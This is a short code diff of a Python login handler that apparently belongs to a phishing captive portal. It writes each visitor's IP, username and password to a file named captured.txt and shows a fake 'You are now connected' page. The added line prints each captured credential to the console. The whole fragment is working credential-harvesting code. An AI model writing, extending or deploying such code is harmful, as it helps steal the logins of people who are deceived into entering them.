@@ -52,6 +52,7 @@ def login():
     ip = request.remote_addr
     with open("captured.txt", "a") as f:
         f.write(f"IP: {ip}, Username: {user}, Password: {password}\n")
+    print(f"[+] Captured credentials from {ip}: {user}/{password}")
     return "<h1>Thank you. You are now connected.</h1>"
 
 # Catch-all fallback
